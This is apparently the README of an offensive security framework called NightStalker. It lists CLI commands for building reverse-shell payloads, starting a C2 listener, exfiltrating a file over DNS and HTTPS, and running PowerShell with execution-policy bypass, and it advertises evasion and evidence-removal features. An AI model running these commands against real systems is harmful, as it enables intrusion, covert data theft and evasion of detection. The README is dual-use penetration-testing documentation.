# 🌙 NightStalker - Advanced Offensive Security Framework

A comprehensive offensive security framework featuring advanced exploitation capabilities, sophisticated attack chains, and production-ready tooling for professional security research and penetration testing.

## 🚀 Quick Start

### 🎯 Interactive Mode (Recommended)
```bash
# Install and launch
./install_nightstalker.sh

# Start interactive mode
./nightstalker.sh

# Navigate through the enhanced menu system:
# 1. Payloads - Build and manage payloads
# 2. Stealth Server - Advanced stealth operations
# 3. Stealth Payload Builder - Create stealth payloads
# 4. Red Team Operations - Advanced red teaming
# 5. Web Red Teaming - Web exploitation framework
# 6. C2 Operations - Command & control
# 7. Exit
```

### 🔧 Command-Line Interface
```bash
# Advanced exploitation
./nightstalker.sh redteam exploit --target 192.168.1.100 --type web --chain web_to_system

# Build stealth payloads
./nightstalker.sh stealth build --lhost 192.168.1.100 --lport 4444 --https

# Run reconnaissance
./nightstalker.sh redteam exploit --target target.com --type web

# Start C2 server
./nightstalker.sh c2 server --host 0.0.0.0 --port 4444

# Data exfiltration
./nightstalker.sh exfil --data sensitive.txt --channels dns https
```

### 🖥️ Windows Users
```cmd
# Use the batch file launcher
.\nightstalker.bat --help
.\nightstalker.bat redteam exploit --target 192.168.1.100 --type web
.\nightstalker.bat stealth build --lhost 192.168.1.100 --lport 4444

# Or use PowerShell launcher
powershell -ExecutionPolicy Bypass -File nightstalker.ps1 --help
powershell -ExecutionPolicy Bypass -File nightstalker.ps1 stealth demo
```

## 🆕 New Features

### 💀 Advanced Exploitation Module
- **Multi-Phase Attack Chains**: Sophisticated attack sequences (web_to_system, network_to_domain, social_to_physical)
- **Comprehensive Reconnaissance**: Automated target enumeration, port scanning, and vulnerability assessment
- **Exploitation Types**: Web, Network, Social, Physical, and Supply Chain attacks
- **Professional Reporting**: HTML and JSON reports with detailed analysis

### 🎮 Enhanced CLI System
- **Persistent Interactive Menus**: Hierarchical menu system with guided user experience
- **Command-Line Interface**: Advanced argument parsing with detailed help and subcommands
- **Auto-Detection**: Automatic NightStalker home directory detection and creation
- **Error Handling**: Robust error handling and user feedback throughout

### 🔧 Tool Management
- **Universal Tool Manager**: Automatic detection and installation of required tools
- **Cross-Platform Support**: Windows, Linux, macOS package manager integration
- **Dependency Resolution**: Comprehensive tool dependency management

## 📚 Documentation

### 📖 Core Documentation
- **[Enhancement Summary](NIGHTSTALKER_ENHANCEMENT_SUMMARY.md)** - Complete enhancement overview
- **[Main Documentation](docs/core/README.md)** - Complete project overview
- **[Directory Structure](docs/core/DIRECTORY_STRUCTURE.md)** - Project organization
- **[Framework Selection](docs/core/FRAMEWORK_SELECTION_GUIDE.md)** - Choose the right framework
- **[File Organization](docs/core/FILE_ORGANIZATION_GUIDE.md)** - File categorization
- **[Project Structure](docs/core/PROJECT_STRUCTURE_OVERVIEW.md)** - Visual structure overview

### 🌐 Web Exploitation Framework
- **[Web Framework Guide](docs/web/WEB_EXPLOIT_FRAMEWORK_README.md)** - Complete web exploitation guide
- **[Web Red Teaming](docs/web/WEB_RED_TEAMING_GUIDE.md)** - Web red teaming techniques

### 🦠 Red Teaming Framework
- **[Advanced Exploitation](nightstalker/redteam/advanced_exploitation.py)** - New advanced exploitation module
- **[Linux Deployment](docs/redteam/LINUX_DEPLOYMENT_GUIDE.md)** - Linux setup and deployment
- **[Exfiltration Guide](docs/redteam/EXFILTRATION_GUIDE.md)** - Data exfiltration techniques
- **[Covert Server](docs/redteam/COVERT_SERVER_GUIDE.md)** - Covert server setup
- **[Tor Setup](docs/redteam/TOR_QUICK_SETUP.md)** - Tor hidden service setup
- **[Reverse Shell Deployer](docs/REVERSE_SHELL_DEPLOYER.md)** - Reverse shell deployment with obfuscation
- **[Stealth C2 Guide](docs/STEALTH_C2_GUIDE.md)** - Covert command & control system
- **[Advanced Injector Guide](docs/ADVANCED_INJECTOR_GUIDE.md)** - Advanced shellcode injection with evasion
- **[Stealth Payload Guide](docs/STEALTH_PAYLOAD_GUIDE.md)** - Stealth reverse shell payload with anti-detection

## 🧪 Examples & Testing

### 📋 Examples
- **[Main Demo](examples/demo.py)** - Framework demonstration
- **[Payload Building](examples/payloads/)** - Payload creation examples
- **[Exfiltration](examples/exfiltration/)** - Data exfiltration examples
- **[Web Red Teaming](examples/webred/)** - Web exploitation examples
- **[Reverse Shell Demo](examples/reverse_shell_demo.py)** - Reverse shell deployment demonstration

### 🧪 Testing
- **[Unit Tests](tests/unit/)** - Individual component testing
- **[Integration Tests](tests/integration/)** - Framework integration testing
- **[Compatibility Tests](tests/compatibility/)** - Cross-platform testing

## 🛠️ Setup & Installation

### 📦 Installation Files
- **[Requirements](setup/requirements.txt)** - Python dependencies
- **[Setup Script](setup/setup.py)** - Framework installation
- **[Linux Installer](setup/install.sh)** - Linux installation script
- **[Web Framework Installer](setup/install_web_exploit_framework.py)** - Web framework setup

### 🎨 User Interfaces
- **[GUI Builder](scripts/gui_exe_builder.py)** - GUI payload builder
- **[Web TUI](nightstalker/redteam/web_exploit_tui.py)** - Web exploitation TUI

## 📊 Data & Configuration

### ⚙️ Configuration
- **[Config Directory](data/config/)** - Framework configuration files
- **[JSON Data](data/json/)** - JSON configuration and status files
- **[Log Files](data/logs/)** - Framework operation logs

## 🏗️ Enhanced Framework Structure

### 🌙 NightStalker Core
```
nightstalker/
├── cli.py                    # Enhanced CLI with interactive menus
├── redteam/                  # Red teaming modules
│   ├── advanced_exploitation.py  # NEW: Advanced exploitation module
│   ├── payload_builder.py        # Enhanced payload builder
│   ├── c2/                       # Command & control
│   │   └── command_control.py    # Enhanced C2 with stealth
│   ├── exfiltration.py           # Covert data exfiltration
│   ├── infection_watchers.py     # File monitoring
│   ├── self_rebuild.py           # Environment management
│   ├── webred.py                 # Web red teaming
│   └── web_exploit_framework.py  # Web exploitation framework
├── core/                     # Core framework components
├── builder/                  # Payload building
├── c2/                       # Stealth C2
└── utils/                    # Utilities
    └── tool_manager.py       # NEW: Universal tool manager
```

### 🌐 NightStalkerWeb
```
nightstalker_web/
├── modules/          # Recon, exploit, bruteforce, post modules
├── tools/            # Installed security tools
├── loot/             # Target-specific results
└── bin/              # Wrapper scripts
```

## 🎯 Enhanced Use Cases

### 💀 Advanced Exploitation
- **Single Target Exploitation**: Comprehensive exploitation with configurable parameters
- **Attack Chains**: Multi-phase attack sequences with detailed phase tracking
- **Reconnaissance**: Automated target enumeration and vulnerability scanning
- **Post-Exploitation**: Advanced post-exploitation techniques

### 🌐 Web Exploitation
- **Web Application Security Testing**
- **Vulnerability Assessment**
- **Penetration Testing**
- **Bug Bounty Hunting**

### 🦠 Red Teaming
- **Advanced Persistent Threat Simulation**
- **Stealth Operations**
- **Covert Data Exfiltration**
- **Incident Response Training**

## 🔧 Technical Features

### 🔒 Security Features
- **Encryption**: AES-256 encryption for sensitive data
- **Obfuscation**: Code obfuscation and anti-analysis techniques
- **Stealth**: Advanced stealth and evasion capabilities
- **Cleanup**: Secure evidence removal and cleanup procedures

### 🌍 Cross-Platform Support
- **Windows**: Full Windows compatibility with PowerShell integration
- **Linux**: Native Linux support with bash scripting
- **macOS**: macOS compatibility with appropriate tool detection
- **Architecture**: x86, x64, ARM support

### 📈 Performance
- **Parallel Processing**: Multi-threaded operations where appropriate
- **Caching**: Intelligent caching of results and configurations
- **Resource Management**: Efficient resource utilization
- **Memory Optimization**: Optimized memory usage for large operations

## 🔒 Security & Ethics

**IMPORTANT**: This framework is designed for authorized security testing and educational purposes only.

- **Authorization Required**: Only test systems you own or have explicit permission to test
- **Educational Purpose**: Use for learning and authorized security assessments
- **No Malicious Use**: Do not use for unauthorized access or malicious activities
- **Compliance**: Follow all applicable laws and regulations
- **Responsible Disclosure**: Follow proper vulnerability disclosure procedures

## 📞 Support

- **Documentation**: Check the guides in the `docs/` directory
- **Examples**: Review the example scripts in `examples/`
- **Testing**: Run tests in the `tests/` directory
- **Issues**: Report bugs on GitHub Issues

## 🚀 Getting Started

1. **Install the Framework**:
   ```bash
   ./install_nightstalker.sh
   ```

2. **Start Interactive Mode**:
   ```bash
   ./nightstalker.sh
   ```

3. **Explore the Menus**:
   - Navigate through the enhanced menu system
   - Try different modules and capabilities
   - Review the documentation for detailed usage

4. **Run Examples**:
   ```bash
   # Build a payload
   ./nightstalker.sh payload build --type reverse_shell --format python
   
   # Run reconnaissance
   ./nightstalker.sh redteam exploit --target target.com --type web
   
   # Start C2 server
   ./nightstalker.sh c2 server --host 0.0.0.0 --port 4444
   ```

---

**Remember**: Always obtain proper authorization before testing any systems, and follow responsible disclosure practices when reporting vulnerabilities.

**Happy Hacking! 🎯**
